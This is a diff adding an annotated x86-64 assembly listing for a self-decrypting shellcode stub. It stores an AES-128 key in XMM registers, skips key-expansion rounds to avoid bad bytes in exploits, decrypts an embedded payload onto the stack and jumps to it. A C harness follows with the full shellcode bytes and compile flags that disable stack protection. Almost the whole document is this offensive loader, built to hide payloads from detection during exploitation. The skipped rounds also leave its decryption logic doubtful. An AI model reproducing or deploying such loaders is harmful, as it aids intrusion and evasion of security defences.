@@ -1,0 +1,158 @@
+# let's store the key
+49 be 47 b4 e3 d8 4f    movabs $0x8eb1e4fd8e3b447,%r14
+1e eb 08
+# the first half of the key is reversed and goes to the R14, because Intel is little-endian and you can't store values directly to the XMM
+66 49 0f 6e c6       	movq   %r14,%xmm0
+# store it in the half of XMM0 (64 to 128 bits), it's pretty hackerish and undocumented since, XMM doesn't suppose to be modified directly, but with pointers
+49 bf 37 bf bb fb 24    movabs $0x2f41a524fbbbbf37,%r15
+a5 41 2f
+# the second half of the key is each half-reversed and goes to the R15, because we need to swap it after
+66 49 0f 6e ef       	movq   %r15,%xmm5
+# store it in the half of XMM5
+0f c6 c0 1b          	shufps $0x1b,%xmm0,%xmm0
+# because XMM is 128 bits, we will put the first half of the key to the second half of XMM0 and its first half will be zeroed
+0f c6 c5 1b          	shufps $0x1b,%xmm5,%xmm0
+# we will put the first half of XMM3 to th first half of XMM0, thus the key is entirely stored in XMM0
+# it's even more hackerish, but it's the best way I found to store an arbitrary value in the XMM without a pointer/buffer/location
+
+# let's compute the key by expanding it since, we use AES
+0f 28 d8             	movaps %xmm0,%xmm3
+66 0f ef f6          	pxor   %xmm6,%xmm6
+# erasing XMM6 (used for storage) is necessary, otherwise decryption might fail
+# now the first round of the expansion
+66 0f 3a df c8 01    	aeskeygenassist $1,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+# the binary value wouldn't contain zeroes once converted to hex
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+# the end of the expansion
+66 0f 38 db d0       	aesimc %xmm0,%xmm2
+# same thing for the other 9 rounds since, we use 128-bit key
+66 0f 3a df c8 02    	aeskeygenassist $2,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 0f 38 db f8       	aesimc %xmm0,%xmm7
+# the 3rd round is omited because, it contains potentially bad character - 0x04 which is EOT and it can cause problems when exploiting remote binaries
+66 0f 3a df c8 08    	aeskeygenassist $8,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 44 0f 38 db c8    	aesimc %xmm0,%xmm9
+66 0f 3a df c8 10    	aeskeygenassist $16,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 44 0f 38 db f0    	aesimc %xmm0,%xmm14
+# the 6th round is also omited because, it contains potentially bad character - 0x20 which is space and it can cause problems when exploiting arguments in binaries
+66 0f 3a df c8 40    	aeskeygenassist $64,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 44 0f 38 db e0    	aesimc %xmm0,%xmm12
+66 0f 3a df c8 80    	aeskeygenassist $128,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 44 0f 38 db d8    	aesimc %xmm0,%xmm11
+66 0f 3a df c8 1b    	aeskeygenassist $27,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+66 44 0f 38 db d0    	aesimc %xmm0,%xmm10
+66 0f 3a df c8 36    	aeskeygenassist $54,%xmm0,%xmm1
+66 0f 70 c9 ff       	pshufd $0xff,%xmm1,%xmm1
+0f c6 f0 10          	shufps $0b00010000,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+0f c6 f0 8c          	shufps $0b10001100,%xmm0,%xmm6
+66 0f ef c6          	pxor   %xmm6,%xmm0
+66 0f ef c1          	pxor   %xmm1,%xmm0
+# since it's the last round, the expansion ends here
+44 0f 28 f8          	movaps %xmm0,%xmm15
+# I know that, all this could be optimized with a call to a macro (function), but I don't have time for this since, it needs to be obfuscated in order to eliminate all null bytes with jumps
+
+# ok, now we can decrypt in ECB mode
+# same routine as for th key goes for the code
+49 be fc bb 2a a5 ad    movabs $0x9502d0ada52abbfc,%r14
+d0 02 95
+# first half of the code
+66 49 0f 6e c6       	movq   %r14,%xmm0
+49 bf 35 3e 6c e9 92    movabs $0xd57b6692e96c3e35,%r15
+66 7b d5
+# second half of the code (each half-reversed)
+66 49 0f 6e ef       	movq   %r15,%xmm5
+0f c6 c0 1b          	shufps $0x1b,%xmm0,%xmm0
+0f c6 c5 1b          	shufps $0x1b,%xmm5,%xmm0
+
+# the 10 rounds decryption
+66 41 0f ef c7       	pxor   %xmm15,%xmm0
+66 41 0f 38 de c2    	aesdec %xmm10,%xmm0
+66 41 0f 38 de c3    	aesdec %xmm11,%xmm0
+66 41 0f 38 de c4    	aesdec %xmm12,%xmm0
+# note that once again we omit the 6th rounded XMM13
+66 41 0f 38 de c6    	aesdec %xmm14,%xmm0
+66 41 0f 38 de c1    	aesdec %xmm9,%xmm0
+# and again we omit the 3rd rounded XMM8
+66 0f 38 de c7       	aesdec %xmm7,%xmm0
+66 0f 38 de c2       	aesdec %xmm2,%xmm0
+66 0f 38 df c3       	aesdeclast %xmm3,%xmm0
+
+# finally, we can move the decrypted block to the memory
+48 89 d6             	mov    %rdx,%rsi
+0f 29 06             	movaps %xmm0,(%rsi)
+# GCC will store stack address in RDX, so for the morpher we will save the pointer from RDX to RSI, without any additional mathematical operation, thereby the shellcode will rewrite it-self
+
+# second block decryption juste like the first-one
+49 be fb 65 55 86 0c    movabs $0xbca5d00c865565fb,%r14
+d0 a5 bc
+66 49 0f 6e c6       	movq   %r14,%xmm0
+49 bf d2 a6 75 e4 33    movabs $0x211b4133e475a6d2,%r15
+41 1b 21
+66 49 0f 6e ef       	movq   %r15,%xmm5
+0f c6 c0 1b          	shufps $0x1b,%xmm0,%xmm0
+0f c6 c5 1b          	shufps $0x1b,%xmm5,%xmm0
+
+66 41 0f ef c7       	pxor   %xmm15,%xmm0
+66 41 0f 38 de c2    	aesdec %xmm10,%xmm0
+66 41 0f 38 de c3    	aesdec %xmm11,%xmm0
+66 41 0f 38 de c4    	aesdec %xmm12,%xmm0
+66 41 0f 38 de c6    	aesdec %xmm14,%xmm0
+66 41 0f 38 de c1    	aesdec %xmm9,%xmm0
+66 0f 38 de c7       	aesdec %xmm7,%xmm0
+66 0f 38 de c2       	aesdec %xmm2,%xmm0
+66 0f 38 df c3       	aesdeclast %xmm3,%xmm0
+
+# move it after already written 16 bytes, using RDX, so we are not limited by the length (16 will be constant, so no zeroes)
+48 83 c2 10          	add    $16,%rdx
+0f 29 02             	movaps %xmm0,(%rdx)
+# "Release The Kraken!" I mean, shellcode
+ff e6                	jmpq   *%rsi
+
+# TEST
+int length=528;
+unsigned char shellcode[]="\x49\xbe\x47\xb4\xe3\xd8\x4f\x1e\xeb\x08\x66\x49\x0f\x6e\xc6\x49\xbf\x37\xbf\xbb\xfb\x24\xa5\x41\x2f\x66\x49\x0f\x6e\xef\x0f\xc6\xc0\x1b\x0f\xc6\xc5\x1b\x0f\x28\xd8\x66\x0f\xef\xf6\x66\x0f\x3a\xdf\xc8\x01\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x0f\x38\xdb\xd0\x66\x0f\x3a\xdf\xc8\x02\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x0f\x38\xdb\xf8\x66\x0f\x3a\xdf\xc8\x08\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x44\x0f\x38\xdb\xc8\x66\x0f\x3a\xdf\xc8\x10\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x44\x0f\x38\xdb\xf0\x66\x0f\x3a\xdf\xc8\x40\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x44\x0f\x38\xdb\xe0\x66\x0f\x3a\xdf\xc8\x80\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x44\x0f\x38\xdb\xd8\x66\x0f\x3a\xdf\xc8\x1b\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x66\x44\x0f\x38\xdb\xd0\x66\x0f\x3a\xdf\xc8\x36\x66\x0f\x70\xc9\xff\x0f\xc6\xf0\x10\x66\x0f\xef\xc6\x0f\xc6\xf0\x8c\x66\x0f\xef\xc6\x66\x0f\xef\xc1\x44\x0f\x28\xf8\x49\xbe\xfc\xbb\x2a\xa5\xad\xd0\x02\x95\x66\x49\x0f\x6e\xc6\x49\xbf\x35\x3e\x6c\xe9\x92\x66\x7b\xd5\x66\x49\x0f\x6e\xef\x0f\xc6\xc0\x1b\x0f\xc6\xc5\x1b\x66\x41\x0f\xef\xc7\x66\x41\x0f\x38\xde\xc2\x66\x41\x0f\x38\xde\xc3\x66\x41\x0f\x38\xde\xc4\x66\x41\x0f\x38\xde\xc6\x66\x41\x0f\x38\xde\xc1\x66\x0f\x38\xde\xc7\x66\x0f\x38\xde\xc2\x66\x0f\x38\xdf\xc3\x48\x89\xd6\x0f\x29\x06\x49\xbe\xfb\x65\x55\x86\x0c\xd0\xa5\xbc\x66\x49\x0f\x6e\xc6\x49\xbf\xd2\xa6\x75\xe4\x33\x41\x1b\x21\x66\x49\x0f\x6e\xef\x0f\xc6\xc0\x1b\x0f\xc6\xc5\x1b\x66\x41\x0f\xef\xc7\x66\x41\x0f\x38\xde\xc2\x66\x41\x0f\x38\xde\xc3\x66\x41\x0f\x38\xde\xc4\x66\x41\x0f\x38\xde\xc6\x66\x41\x0f\x38\xde\xc1\x66\x0f\x38\xde\xc7\x66\x0f\x38\xde\xc2\x66\x0f\x38\xdf\xc3\x48\x83\xc2\x10\x0f\x29\x02\xff\xe6";
+main(){int (*ret)()=(int(*)()) shellcode; ret();}
+gcc -m64 -fno-stack-protector -z execstack shellcode.c -o shellcode
+./shellcode
+
